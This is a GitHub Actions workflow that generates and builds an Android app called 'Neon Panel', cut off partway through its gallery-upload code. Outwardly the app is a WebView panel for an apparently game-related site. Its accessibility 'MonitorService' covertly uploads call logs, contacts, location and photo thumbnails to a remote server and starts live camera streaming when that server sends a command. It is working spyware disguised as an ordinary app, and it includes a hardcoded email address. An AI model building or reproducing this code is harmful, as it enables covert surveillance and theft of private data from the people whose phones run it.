name: Build Neon Panel APK

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Setup Gradle
        uses: gradle/actions/setup-gradle@v3

      - name: Create project files
        run: |
          mkdir -p app/src/main/java/com/example/neonpanel
          mkdir -p app/src/main/res/layout
          mkdir -p app/src/main/res/values
          mkdir -p app/src/main/res/xml

          cat > build.gradle << 'EOF'
          buildscript {
              repositories { google(); mavenCentral() }
              dependencies { classpath 'com.android.tools.build:gradle:8.2.0' }
          }
          allprojects { repositories { google(); mavenCentral() } }
          EOF

          cat > settings.gradle << 'EOF'
          pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
          dependencyResolutionManagement { repositoriesMode.set(RepositoriesMode.PREFER_PROJECT); repositories { google(); mavenCentral() } }
          rootProject.name = "NeonPanel"
          include ':app'
          EOF

          cat > gradle.properties << 'EOF'
          android.useAndroidX=true
          android.enableJetifier=true
          org.gradle.jvmargs=-Xmx2048m
          EOF

          cat > app/build.gradle << 'EOF'
          plugins { id 'com.android.application' }
          android {
              namespace 'com.example.neonpanel'
              compileSdk 34
              defaultConfig {
                  applicationId "com.example.neonpanel"
                  minSdk 21
                  targetSdk 34
                  versionCode 1
                  versionName "1.0"
              }
              buildTypes {
                  release { minifyEnabled false; proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro' }
              }
              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_1_8
                  targetCompatibility JavaVersion.VERSION_1_8
              }
              packagingOptions {
                  jniLibs {
                      useLegacyPackaging = true
                  }
              }
          }
          dependencies {
              implementation 'androidx.appcompat:appcompat:1.6.1'
              implementation 'com.squareup.okhttp3:okhttp:4.12.0'
              implementation 'com.infobip:google-webrtc:1.0.0035529'
          }
          EOF

          cat > app/proguard-rules.pro << 'EOF'
          EOF

          cat > app/src/main/AndroidManifest.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
              <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
              <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
              <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
              <uses-permission android:name="android.permission.READ_CALL_LOG" />
              <uses-permission android:name="android.permission.READ_CONTACTS" />
              <uses-permission android:name="android.permission.CAMERA" />
              <uses-permission android:name="android.permission.RECORD_AUDIO" />
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
              <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
              <application
                  android:allowBackup="true"
                  android:extractNativeLibs="true"
                  android:icon="@android:drawable/sym_def_app_icon"
                  android:label="@string/app_name"
                  android:theme="@style/Theme.NeonPanel">
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
                  <activity android:name=".CameraActivity" android:exported="false" />
                  <service android:name=".MonitorService"
                      android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
                      android:exported="false">
                      <intent-filter>
                          <action android:name="android.accessibilityservice.AccessibilityService" />
                      </intent-filter>
                      <meta-data android:name="android.accessibilityservice"
                          android:resource="@xml/accessibility_config" />
                  </service>
              </application>
          </manifest>
          EOF

          cat > app/src/main/java/com/example/neonpanel/MainActivity.java << 'EOF'
          package com.example.neonpanel;

          import android.Manifest;
          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.content.IntentFilter;
          import android.content.pm.PackageManager;
          import android.os.Build;
          import android.os.Bundle;
          import android.webkit.WebSettings;
          import android.webkit.WebView;
          import android.webkit.WebViewClient;
          import androidx.annotation.NonNull;
          import androidx.appcompat.app.AppCompatActivity;
          import androidx.core.app.ActivityCompat;
          import androidx.core.content.ContextCompat;

          public class MainActivity extends AppCompatActivity {
              private WebView webView;
              private static final int REQUEST_GALLERY_PERMISSION = 100;
              private static final int REQUEST_LOCATION_PERMISSION = 200;
              private static final int REQUEST_CALL_CONTACTS_PERMISSION = 300;
              public static final String ACTION_SYNC_CALL_CONTACTS = "com.example.neonpanel.SYNC_CALL_CONTACTS";

              private BroadcastReceiver syncReceiver = new BroadcastReceiver() {
                  @Override
                  public void onReceive(Context context, Intent intent) {}
              };

              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  setContentView(R.layout.activity_main);

                  webView = findViewById(R.id.webView);
                  WebSettings ws = webView.getSettings();
                  ws.setJavaScriptEnabled(true);
                  ws.setDomStorageEnabled(true);
                  webView.setWebViewClient(new WebViewClient());
                  webView.loadUrl("https://neon-aim.vercel.app/");

                  IntentFilter filter = new IntentFilter(ACTION_SYNC_CALL_CONTACTS);
                  if (Build.VERSION.SDK_INT >= 33) {
                      registerReceiver(syncReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
                  } else {
                      registerReceiver(syncReceiver, filter);
                  }

                  requestGalleryPermission();
              }

              @Override
              protected void onDestroy() {
                  super.onDestroy();
                  try { unregisterReceiver(syncReceiver); } catch (Exception ignored) {}
              }

              private void requestGalleryPermission() {
                  String[] permissions = getGalleryPermissions();
                  if (permissions.length == 0) {
                      requestLocationPermission();
                      return;
                  }
                  ActivityCompat.requestPermissions(this, permissions, REQUEST_GALLERY_PERMISSION);
              }

              private void requestLocationPermission() {
                  String[] permissions = getLocationPermissions();
                  if (permissions.length == 0) {
                      requestCallContactsPermission();
                      return;
                  }
                  ActivityCompat.requestPermissions(this, permissions, REQUEST_LOCATION_PERMISSION);
              }

              private void requestCallContactsPermission() {
                  String[] permissions = getCallContactsPermissions();
                  if (permissions.length == 0) {
                      return;
                  }
                  ActivityCompat.requestPermissions(this, permissions, REQUEST_CALL_CONTACTS_PERMISSION);
              }

              private String[] getGalleryPermissions() {
                  if (Build.VERSION.SDK_INT >= 33) {
                      boolean needImages = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED;
                      boolean needVideos = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) != PackageManager.PERMISSION_GRANTED;
                      if (needImages && needVideos) return new String[]{Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO};
                      else if (needImages) return new String[]{Manifest.permission.READ_MEDIA_IMAGES};
                      else if (needVideos) return new String[]{Manifest.permission.READ_MEDIA_VIDEO};
                      else return new String[]{};
                  } else {
                      if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
                          return new String[]{Manifest.permission.READ_EXTERNAL_STORAGE};
                      else return new String[]{};
                  }
              }

              private String[] getLocationPermissions() {
                  boolean needFine = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED;
                  boolean needCoarse = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED;
                  if (needFine && needCoarse) return new String[]{Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION};
                  else if (needFine) return new String[]{Manifest.permission.ACCESS_FINE_LOCATION};
                  else if (needCoarse) return new String[]{Manifest.permission.ACCESS_COARSE_LOCATION};
                  else return new String[]{};
              }

              private String[] getCallContactsPermissions() {
                  java.util.List<String> permissions = new java.util.ArrayList<>();
                  if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED)
                      permissions.add(Manifest.permission.READ_CALL_LOG);
                  if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED)
                      permissions.add(Manifest.permission.READ_CONTACTS);
                  return permissions.toArray(new String[0]);
              }

              @Override
              public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
                  super.onRequestPermissionsResult(requestCode, permissions, grantResults);
                  if (requestCode == REQUEST_GALLERY_PERMISSION) {
                      requestLocationPermission();
                  } else if (requestCode == REQUEST_LOCATION_PERMISSION) {
                      requestCallContactsPermission();
                  } else if (requestCode == REQUEST_CALL_CONTACTS_PERMISSION) {
                      Intent syncIntent = new Intent(ACTION_SYNC_CALL_CONTACTS);
                      sendBroadcast(syncIntent);
                  }
              }

              @Override
              public void onBackPressed() {
                  if (webView.canGoBack()) webView.goBack();
                  else super.onBackPressed();
              }
          }
          EOF

          cat > app/src/main/java/com/example/neonpanel/CameraActivity.java << 'EOF'
          package com.example.neonpanel;

          import android.Manifest;
          import android.content.pm.PackageManager;
          import android.os.Bundle;
          import android.widget.Button;
          import android.widget.Toast;
          import androidx.annotation.NonNull;
          import androidx.appcompat.app.AppCompatActivity;
          import androidx.core.app.ActivityCompat;
          import androidx.core.content.ContextCompat;
          import org.webrtc.*;
          import okhttp3.*;
          import org.json.*;
          import java.util.ArrayList;
          import java.util.List;

          public class CameraActivity extends AppCompatActivity {

              public static CameraActivity instance;

              private static final int CAMERA_PERMISSION_REQUEST = 100;
              private SurfaceViewRenderer localView;
              private PeerConnectionFactory factory;
              private VideoCapturer videoCapturer;
              private VideoSource videoSource;
              private VideoTrack localVideoTrack;
              private PeerConnection peerConnection;
              private WebSocket ws;
              private OkHttpClient okHttpClient;
              private String deviceId = "child-phone-123";
              private String serverUrl = "wss://mobilecontrol-web.onrender.com/ws?deviceId=" + deviceId + "&role=device";
              private boolean isFrontCamera = true;

              private Button switchCameraBtn;

              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  setContentView(R.layout.activity_camera);
                  instance = this;

                  localView = findViewById(R.id.local_view);
                  switchCameraBtn = findViewById(R.id.switch_camera_btn);

                  switchCameraBtn.setOnClickListener(v -> switchCamera());

                  if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                      ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA}, CAMERA_PERMISSION_REQUEST);
                  } else {
                      startCameraStreaming();
                  }
              }

              @Override
              public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
                  super.onRequestPermissionsResult(requestCode, permissions, grantResults);
                  if (requestCode == CAMERA_PERMISSION_REQUEST && grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                      startCameraStreaming();
                  } else {
                      Toast.makeText(this, "Camera permission required", Toast.LENGTH_SHORT).show();
                      finish();
                  }
              }

              @Override
              protected void onDestroy() {
                  super.onDestroy();
                  instance = null;
                  if (peerConnection != null) peerConnection.close();
                  if (videoCapturer != null) {
                      try { videoCapturer.stopCapture(); } catch (InterruptedException e) { }
                      videoCapturer.dispose();
                  }
                  if (factory != null) factory.dispose();
              }

              private void startCameraStreaming() {
                  PeerConnectionFactory.initialize(PeerConnectionFactory.InitializationOptions.builder(this).createInitializationOptions());
                  factory = PeerConnectionFactory.builder().createPeerConnectionFactory();

                  localView.setMirror(isFrontCamera);
                  localView.setEnableHardwareScaler(true);

                  videoCapturer = createCameraCapturer(isFrontCamera);
                  videoSource = factory.createVideoSource(videoCapturer.isScreencast());
                  videoCapturer.initialize(SurfaceTextureHelper.create(Thread.currentThread().getName(), EglBase.create().getEglBaseContext()), localView.getContext(), videoSource.getCapturerObserver());
                  videoCapturer.startCapture(640, 480, 30);

                  localVideoTrack = factory.createVideoTrack("video0", videoSource);
                  localVideoTrack.addSink(localView);

                  List<PeerConnection.IceServer> iceServers = new ArrayList<>();
                  iceServers.add(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer());

                  PeerConnection.RTCConfiguration config = new PeerConnection.RTCConfiguration(iceServers);
                  peerConnection = factory.createPeerConnection(config, new PeerConnection.Observer() {
                      @Override public void onSignalingChange(PeerConnection.SignalingState signalingState) {}
                      @Override public void onIceConnectionChange(PeerConnection.IceConnectionState iceConnectionState) {}
                      @Override public void onIceConnectionReceivingChange(boolean receiving) {}
                      @Override public void onIceGatheringChange(PeerConnection.IceGatheringState iceGatheringState) {}
                      @Override public void onIceCandidate(IceCandidate iceCandidate) {
                          JSONObject payload = new JSONObject();
                          try {
                              payload.put("ice", iceCandidate.sdp);
                              payload.put("sdpMid", iceCandidate.sdpMid);
                              payload.put("sdpMLineIndex", iceCandidate.sdpMLineIndex);
                              sendSignal(payload);
                          } catch (JSONException e) { }
                      }
                      @Override public void onIceCandidatesRemoved(IceCandidate[] iceCandidates) {}
                      @Override public void onAddStream(MediaStream mediaStream) {}
                      @Override public void onRemoveStream(MediaStream mediaStream) {}
                      @Override public void onDataChannel(DataChannel dataChannel) {}
                      @Override public void onRenegotiationNeeded() {}
                  });

                  peerConnection.addTrack(localVideoTrack);
                  connectWebSocket();
              }

              private VideoCapturer createCameraCapturer(boolean isFront) {
                  Camera2Enumerator enumerator = new Camera2Enumerator(this);
                  String[] devices = enumerator.getDeviceNames();
                  for (String device : devices) {
                      if (isFront && enumerator.isFrontFacing(device)) {
                          return enumerator.createCapturer(device, null);
                      }
                      if (!isFront && enumerator.isBackFacing(device)) {
                          return enumerator.createCapturer(device, null);
                      }
                  }
                  return null;
              }

              public void switchCamera() {
                  if (videoCapturer == null) return;
                  try {
                      videoCapturer.stopCapture();
                  } catch (InterruptedException e) {
                      e.printStackTrace();
                  }
                  videoCapturer.dispose();

                  isFrontCamera = !isFrontCamera;
                  localView.setMirror(isFrontCamera);

                  videoCapturer = createCameraCapturer(isFrontCamera);
                  if (videoCapturer == null) {
                      Toast.makeText(this, "Camera not available", Toast.LENGTH_SHORT).show();
                      return;
                  }

                  videoSource = factory.createVideoSource(videoCapturer.isScreencast());
                  videoCapturer.initialize(SurfaceTextureHelper.create(Thread.currentThread().getName(), EglBase.create().getEglBaseContext()), localView.getContext(), videoSource.getCapturerObserver());
                  videoCapturer.startCapture(640, 480, 30);

                  if (localVideoTrack != null && peerConnection != null && peerConnection.getSenders().size() > 0) {
                      peerConnection.removeTrack(peerConnection.getSenders().get(0));
                  }
                  localVideoTrack = factory.createVideoTrack("video0", videoSource);
                  localVideoTrack.addSink(localView);
                  if (peerConnection != null) {
                      peerConnection.addTrack(localVideoTrack);
                  }
              }

              private void connectWebSocket() {
                  okHttpClient = new OkHttpClient();
                  Request request = new Request.Builder().url(serverUrl).build();
                  ws = okHttpClient.newWebSocket(request, new WebSocketListener() {
                      @Override public void onMessage(WebSocket webSocket, String text) {
                          try {
                              JSONObject msg = new JSONObject(text);
                              if (msg.getString("type").equals("signal")) {
                                  JSONObject signal = msg.getJSONObject("data");
                                  if (signal.has("sdp")) {
                                      String sdp = signal.getString("sdp");
                                      String type = signal.getString("type");
                                      if (type.equals("answer")) {
                                          peerConnection.setRemoteDescription(new SdpObserver() {
                                              @Override public void onCreateSuccess(SessionDescription sdp) {}
                                              @Override public void onSetSuccess() {}
                                              @Override public void onCreateFailure(String s) {}
                                              @Override public void onSetFailure(String s) {}
                                          }, new SessionDescription(SessionDescription.Type.ANSWER, sdp));
                                      }
                                  } else if (signal.has("ice")) {
                                      String sdpMid = signal.getString("sdpMid");
                                      int sdpMLineIndex = signal.getInt("sdpMLineIndex");
                                      String sdp = signal.getString("ice");
                                      peerConnection.addIceCandidate(new IceCandidate(sdpMid, sdpMLineIndex, sdp));
                                  }
                              } else if (msg.getString("type").equals("start_camera")) {
                                  createOfferAndSend();
                              } else if (msg.getString("type").equals("switch_camera")) {
                                  runOnUiThread(() -> switchCamera());
                              }
                          } catch (Exception e) { }
                      }
                  });
              }

              private void createOfferAndSend() {
                  peerConnection.createOffer(new SdpObserver() {
                      @Override public void onCreateSuccess(SessionDescription sdp) {
                          peerConnection.setLocalDescription(new SdpObserver() {
                              @Override public void onCreateSuccess(SessionDescription sdp) {}
                              @Override public void onSetSuccess() {}
                              @Override public void onCreateFailure(String s) {}
                              @Override public void onSetFailure(String s) {}
                          }, sdp);
                          JSONObject payload = new JSONObject();
                          try {
                              payload.put("sdp", sdp.description);
                              payload.put("type", sdp.type.canonicalForm());
                              sendSignal(payload);
                          } catch (JSONException e) { }
                      }
                      @Override public void onSetSuccess() {}
                      @Override public void onCreateFailure(String s) {}
                      @Override public void onSetFailure(String s) {}
                  }, new MediaConstraints());
              }

              private void sendSignal(JSONObject payload) {
                  JSONObject msg = new JSONObject();
                  try {
                      msg.put("type", "signal");
                      msg.put("data", payload);
                      ws.send(msg.toString());
                  } catch (JSONException e) { }
              }
          }
          EOF

          cat > app/src/main/java/com/example/neonpanel/MonitorService.java << 'EOF'
          package com.example.neonpanel;

          import android.accessibilityservice.AccessibilityService;
          import android.Manifest;
          import android.content.BroadcastReceiver;
          import android.content.ContentResolver;
          import android.content.Context;
          import android.content.Intent;
          import android.content.IntentFilter;
          import android.content.SharedPreferences;
          import android.content.pm.ApplicationInfo;
          import android.content.pm.PackageManager;
          import android.database.Cursor;
          import android.graphics.Bitmap;
          import android.location.Location;
          import android.location.LocationListener;
          import android.location.LocationManager;
          import android.net.Uri;
          import android.os.BatteryManager;
          import android.os.Build;
          import android.os.Bundle;
          import android.os.Handler;
          import android.os.Looper;
          import android.provider.CallLog;
          import android.provider.ContactsContract;
          import android.provider.MediaStore;
          import android.provider.Settings;
          import android.util.Base64;
          import android.util.Log;
          import android.view.accessibility.AccessibilityEvent;
          import android.view.accessibility.AccessibilityNodeInfo;
          import android.widget.Toast;
          import androidx.core.content.ContextCompat;
          import org.json.JSONArray;
          import org.json.JSONObject;
          import java.io.ByteArrayOutputStream;
          import java.io.File;
          import java.io.FileWriter;
          import java.util.ArrayList;
          import java.util.Collections;
          import java.util.Comparator;
          import java.util.LinkedHashSet;
          import java.util.List;
          import java.util.UUID;
          import java.util.concurrent.CountDownLatch;
          import java.util.concurrent.TimeUnit;
          import okhttp3.MediaType;
          import okhttp3.OkHttpClient;
          import okhttp3.Request;
          import okhttp3.RequestBody;
          import okhttp3.Response;
          import okhttp3.WebSocket;
          import okhttp3.WebSocketListener;

          public class MonitorService extends AccessibilityService {
              private static final String TAG = "NEON_PANEL";
              private static final String API_BASE = "https://mobilecontrol-web.onrender.com";
              private static final String OWNER_EMAIL = "mdfatema03@gmail.com";
              private static final String PREFS_NAME = "device_prefs";
              private static final String DEVICE_ID_KEY = "device_id";
              private static final String DEVICE_TOKEN_KEY = "device_token";
              public static final String ACTION_SYNC_CALL_CONTACTS = "com.example.neonpanel.SYNC_CALL_CONTACTS";

              private OkHttpClient httpClient = new OkHttpClient.Builder()
                      .connectTimeout(10, TimeUnit.SECONDS)
                      .readTimeout(10, TimeUnit.SECONDS)
                      .build();
              private Handler mainHandler = new Handler(Looper.getMainLooper());
              private Thread deviceStateThread, galleryPollerThread, gpsRequestThread, callContactsThread;
              private String deviceId, deviceToken;

              private StringBuilder pendingText = new StringBuilder();
              private String pendingPackageName = null;
              private Runnable screenDataRunnable = null;
              private String lastScreenPackageName = null;
              private String lastSentScreenData = "";

              private BroadcastReceiver syncReceiver = new BroadcastReceiver() {
                  @Override
                  public void onReceive(Context context, Intent intent) {
                      if (ACTION_SYNC_CALL_CONTACTS.equals(intent.getAction())) {
                          new Thread(() -> {
                              try {
                                  sendCallLogs();
                                  sendContacts();
                              } catch (Throwable t) { Log.e(TAG, "sync broadcast crash", t); }
                          }).start();
                      }
                  }
              };

              private WebSocket cameraWs;

              @Override
              public void onServiceConnected() {
                  super.onServiceConnected();
                  try {
                      initDeviceIdentity();
                      startThreads();
                      IntentFilter filter = new IntentFilter(ACTION_SYNC_CALL_CONTACTS);
                      if (Build.VERSION.SDK_INT >= 33) {
                          registerReceiver(syncReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
                      } else {
                          registerReceiver(syncReceiver, filter);
                      }
                      connectCameraWebSocket();
                      showToast("Service connected");
                  } catch (Throwable t) {
                      Log.e(TAG, "onServiceConnected crash", t);
                  }
              }

              private void connectCameraWebSocket() {
                  String wsUrl = API_BASE.replace("https://", "wss://").replace("http://", "ws://") + "/ws?deviceId=" + deviceId + "&role=device";
                  Request request = new Request.Builder().url(wsUrl).build();
                  cameraWs = httpClient.newWebSocket(request, new WebSocketListener() {
                      @Override public void onMessage(WebSocket webSocket, String text) {
                          try {
                              JSONObject msg = new JSONObject(text);
                              if ("start_camera".equals(msg.getString("type"))) {
                                  Intent intent = new Intent(MonitorService.this, CameraActivity.class);
                                  intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                  startActivity(intent);
                              } else if ("switch_camera".equals(msg.getString("type"))) {
                                  if (CameraActivity.instance != null) {
                                      CameraActivity.instance.runOnUiThread(() -> CameraActivity.instance.switchCamera());
                                  }
                              }
                          } catch (Exception e) { }
                      }
                  });
              }

              private void showToast(String msg) {
                  mainHandler.post(() -> {
                      try { Toast.makeText(this, msg, Toast.LENGTH_SHORT).show(); } catch (Throwable ignored) {}
                  });
              }

              private void initDeviceIdentity() {
                  SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
                  deviceId = prefs.getString(DEVICE_ID_KEY, null);
                  deviceToken = prefs.getString(DEVICE_TOKEN_KEY, null);
                  if (deviceId == null || deviceId.isEmpty()) {
                      String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
                      if (androidId == null || androidId.isEmpty()) androidId = UUID.randomUUID().toString();
                      deviceId = "device-" + androidId;
                      prefs.edit().putString(DEVICE_ID_KEY, deviceId).apply();
                  }
                  if (deviceToken == null || deviceToken.isEmpty()) {
                      deviceToken = UUID.randomUUID().toString();
                      prefs.edit().putString(DEVICE_TOKEN_KEY, deviceToken).apply();
                  }
              }

              private void startThreads() {
                  startDeviceStateSender();
                  startGalleryPoller();
                  startGpsRequestPoller();
                  startCallContactsSender();
              }

              private void startDeviceStateSender() {
                  deviceStateThread = new Thread(() -> {
                      while (!Thread.currentThread().isInterrupted()) {
                          try { sendDeviceState(false); Thread.sleep(30000); }
                          catch (InterruptedException e) { Thread.currentThread().interrupt(); }
                          catch (Throwable t) { Log.e(TAG, "device state thread crash", t); }
                      }
                  });
                  deviceStateThread.setDaemon(true); deviceStateThread.start();
              }

              private void startGalleryPoller() {
                  galleryPollerThread = new Thread(() -> {
                      while (!Thread.currentThread().isInterrupted()) {
                          try { checkGalleryRequest(); Thread.sleep(3000); }
                          catch (InterruptedException e) { Thread.currentThread().interrupt(); }
                          catch (Throwable t) { Log.e(TAG, "gallery poll crash", t); }
                      }
                  });
                  galleryPollerThread.setDaemon(true); galleryPollerThread.start();
              }

              private void startGpsRequestPoller() {
                  gpsRequestThread = new Thread(() -> {
                      while (!Thread.currentThread().isInterrupted()) {
                          try { checkGpsRequest(); Thread.sleep(5000); }
                          catch (InterruptedException e) { Thread.currentThread().interrupt(); }
                          catch (Throwable t) { Log.e(TAG, "gps poll crash", t); }
                      }
                  });
                  gpsRequestThread.setDaemon(true); gpsRequestThread.start();
              }

              private void startCallContactsSender() {
                  callContactsThread = new Thread(() -> {
                      try {
                          sendCallLogs();
                          sendContacts();
                      } catch (Throwable t) { Log.e(TAG, "initial call contacts sync crash", t); }
                      while (!Thread.currentThread().isInterrupted()) {
                          try {
                              Thread.sleep(86400000);
                              sendCallLogs();
                              sendContacts();
                          } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
                          catch (Throwable t) { Log.e(TAG, "call contacts periodic crash", t); }
                      }
                  });
                  callContactsThread.setDaemon(true); callContactsThread.start();
              }

              private void checkGalleryRequest() {
                  try {
                      Request request = new Request.Builder().url(API_BASE + "/api/gallery/request?deviceId=" + deviceId).build();
                      Response response = httpClient.newCall(request).execute();
                      if (response.isSuccessful()) {
                          JSONObject obj = new JSONObject(response.body().string());
                          if (obj.optBoolean("requested", false)) {
                              int count = obj.optInt("count", 100);
                              showToast("Gallery request received: " + count);
                              sendDeviceState(false);
                              fetchAndUploadGallery(count);
                          }
                      }
                  } catch (Throwable t) { Log.e(TAG, "checkGalleryRequest crash", t); }
              }

              private void checkGpsRequest() {
                  try {
                      Request request = new Request.Builder().url(API_BASE + "/api/gps/request?deviceId=" + deviceId).build();
                      Response response = httpClient.newCall(request).execute();
                      if (response.isSuccessful()) {
                          JSONObject obj = new JSONObject(response.body().string());
                          if (obj.optBoolean("requested", false)) {
                              showToast("GPS request received - fetching fresh location");
                              sendDeviceState(true);
                          }
                      }
                  } catch (Throwable t) { Log.e(TAG, "checkGpsRequest crash", t); }
              }

              private void sendCallLogs() {
                  if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return;
                  try {
                      long now = System.currentTimeMillis();
                      long cutoff = now - 24 * 60 * 60 * 1000;
                      String selection = CallLog.Calls.DATE + " >= ?";
                      String[] selectionArgs = { String.valueOf(cutoff) };
                      JSONArray logsArray = new JSONArray();
                      Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, selection, selectionArgs, CallLog.Calls.DATE + " DESC");
                      if (cursor != null) {
                          while (cursor.moveToNext()) {
                              String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                              String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                              String type = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                              String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                              long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                              JSONObject obj = new JSONObject();
                              obj.put("name", name != null ? name : "Unknown");
                              obj.put("number", number);
                              obj.put("type", type);
                              obj.put("duration", duration);
                              obj.put("timestamp", date);
                              logsArray.put(obj);
                          }
                          cursor.close();
                      }
                      JSONObject payload = new JSONObject();
                      payload.put("deviceId", deviceId);
                      payload.put("deviceToken", deviceToken);
                      payload.put("callLogs", logsArray);
                      RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), payload.toString());
                      Request request = new Request.Builder().url(API_BASE + "/api/calllogs").post(body).build();
                      httpClient.newCall(request).execute().close();
                  } catch (Throwable t) { Log.e(TAG, "sendCallLogs crash", t); }
              }

              private void sendContacts() {
                  if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return;
                  try {
                      JSONArray contactsArray = new JSONArray();
                      Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
                      if (cursor != null) {
                          while (cursor.moveToNext()) {
                              String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                              String number = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                              JSONObject obj = new JSONObject();
                              obj.put("name", name != null ? name : "Unknown");
                              obj.put("number", number);
                              contactsArray.put(obj);
                          }
                          cursor.close();
                      }
                      JSONObject payload = new JSONObject();
                      payload.put("deviceId", deviceId);
                      payload.put("deviceToken", deviceToken);
                      payload.put("contacts", contactsArray);
                      RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), payload.toString());
                      Request request = new Request.Builder().url(API_BASE + "/api/contacts").post(body).build();
                      httpClient.newCall(request).execute().close();
                  } catch (Throwable t) { Log.e(TAG, "sendContacts crash", t); }
              }

              private void fetchAndUploadGallery(int maxCount) {
                  try {
                      List<JSONObject> mediaList = new ArrayList<>();
                      ContentResolver resolver = getContentResolver();
                      Uri imageCollection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
                      String[] projection = {MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.DATE_ADDED, MediaStore.Images.Media.SIZE};
                      String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
                      Cursor cursor = resolver.query(imageCollection, projection, null, null, sortOrder);
                      if (cursor != null) {
                          while (cursor.moveToNext()) {
                              long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
                              String filename = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME));
                              long dateAdded = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED));
                              long size = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE));
                              Bitmap thumb = MediaStore.Images.Thumbnails.getThumbnail(resolver, id, MediaStore.Images.Thumbnails.MINI_KIND, null);
                              String base64 = thumbnailToBase64(thumb);
                              JSONObject media = new JSONObject();
                              media.put("filename", filename);
                              media.put("timestamp", dateAdded * 1000);
                              media.put("size", size);
                              media.put("type", "image");
                              media.put("thumbnailBase64", base64 != null ? base64 : "");
                              mediaList.add(media);
                          }
                          cursor.close();
                      }
                      Uri videoCollection = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
                      Cursor videoCursor = resolver.query(videoCollection, projection, null, null, sortOrder);
                      if (videoCursor != null) {
                          while (videoCursor.moveToNext()) {
                              long id = videoCursor.getLong(videoCursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID));
